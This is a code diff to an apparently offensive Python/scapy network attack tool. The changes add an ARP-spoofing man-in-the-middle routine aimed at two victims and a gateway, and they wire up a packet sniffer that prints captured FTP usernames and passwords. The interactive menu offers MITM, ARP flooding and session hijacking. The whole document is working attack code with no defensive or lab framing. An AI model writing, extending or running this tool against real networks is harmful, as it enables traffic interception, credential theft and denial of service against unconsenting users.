@@ -31,8 +31,8 @@ def arp_spoof(target_ip, spoof_ip):
 def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     print ("\n[*] Restoring Targets...")
 
-    scapy.send(scapy.ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7)
-    scapy.send(scapy.ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
+    scapy.send(scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=7)
+    scapy.send(scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=7)
     disable_ip_forwarding()
     print ("[*] Shutting Down...")
     sys.exit(1)
@@ -73,52 +73,82 @@ def arp_flood(target_ip, target_mac, gateway_ip, gateway_mac, thread_count=500):
         restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
         sys.exit(0)
 
+def mitm_attack(target_ip, target_2_ip, gateway_ip):
+    target_mac = get_mac(target_ip)
+    target_2_mac = get_mac(target_2_ip)
+    gateway_mac = get_mac(gateway_ip)
+
+    if not target_mac or not target_2_mac or not gateway_mac:
+        print("[!] Unable to get MAC address. Exiting..")
+        sys.exit(0)
+    
+    enable_ip_forwarding()
+
+    try:
+        print("[*] Starting MITM attack...")
+        while True:
+            arp_spoof(target_ip, gateway_ip)
+            arp_spoof(gateway_ip, target_ip)
+            arp_spoof(target_2_ip, gateway_ip)
+            arp_spoof(gateway_ip, target_2_ip)
+            time.sleep(2)
+    
+    except KeyboardInterrupt:
+        print("\n[!] Stopping MITM attack and restoring network...")
+        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+        restore_network(gateway_ip, gateway_mac, target_2_ip, target_2_mac)
+        sys.exit(0)
+
 def session_hijacking(interface):
     print("[*] Starting session hijacking...")
 
     def process_packet(packet):
-            if packet.haslayer(TCP) and packet.haslayer(Raw):
-                payload = packet[Raw].load.decode(errors='ignore')
-                if 'USER' in payload or 'PASS' in payload:
-                    print(f"[+] FTP Credentials: {payload.strip()}")
+        if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
+            payload = packet[scapy.Raw].load.decode(errors='ignore')
+            if 'USER' in payload or 'PASS' in payload:
+                print(f"[+] FTP Credentials: {payload.strip()}")
 
     print("[*] Sniffing on interface:", interface)
     scapy.sniff(iface=interface, store=False, prn=process_packet)
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip>")
+    if len(sys.argv) < 3:
+        print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip> [target_2_ip]")
         sys.exit(1)
 
-    enable_ip_forwarding()
     target_ip = sys.argv[1]
     gateway_ip = sys.argv[2]
+    target_2_ip = sys.argv[3] if len(sys.argv) == 4 else None
 
-    gateway_mac = get_mac(gateway_ip)
-    if gateway_mac is None:
-        print("[!] Unable to get gateway MAC address. Exiting..")
-        sys.exit(0)
+    if target_2_ip:
+        mitm_attack(target_ip, target_2_ip, gateway_ip)
     else:
-        print(f"[*] Gateway MAC address: {gateway_mac}")
+        enable_ip_forwarding()
+        gateway_mac = get_mac(gateway_ip)
+        if gateway_mac is None:
+            print("[!] Unable to get gateway MAC address. Exiting..")
+            sys.exit(0)
+        else:
+            print(f"[*] Gateway MAC address: {gateway_mac}")
 
-    target_mac = get_mac(target_ip)
-    if target_mac is None:
-        print("[!] Unable to get target MAC address. Exiting..")
-        sys.exit(0)
-    else:
-        print(f"[*] Target MAC address: {target_mac}")
+        target_mac = get_mac(target_ip)
+        if target_mac is None:
+            print("[!] Unable to get target MAC address. Exiting..")
+            sys.exit(0)
+        else:
+            print(f"[*] Target MAC address: {target_mac}")
 
-    print("1. MITM\n2. ARP Flooding\n3. Session Hijacking")
-    attack = input("Pick an attack: ")
-    if attack == '1':
-        target_2 = input("Enter another victim IP:")
-        scapy.arp_mitm(target_ip, target_2)
-    elif attack == '2':
-        arp_flood(target_ip, target_mac, gateway_ip, gateway_mac)
-    elif attack == '3':
-        scapy.arp_mitm(target_ip, gateway_ip)
-        # interface = input("Enter the network interface to sniff on: ")
-        # session_hijacking(interface)
-    else:
-        print("Invalid choice. Exiting...")
-        sys.exit(1)
+        print("1. MITM\n2. ARP Flooding\n3. Session Hijacking")
+        attack = input("Pick an attack: ")
+        if attack == '1':
+            target_2_ip = input("Enter another victim IP:")
+            mitm_attack(target_ip, target_2_ip, gateway_ip)
+        elif attack == '2':
+            arp_flood(target_ip, target_mac, gateway_ip, gateway_mac)
+        elif attack == '3':
+            interface = input("Enter the network interface to sniff on: ")
+            session_hijacking(interface)
+        else:
+            print("Invalid choice. Exiting...")
+            sys.exit(1)
+
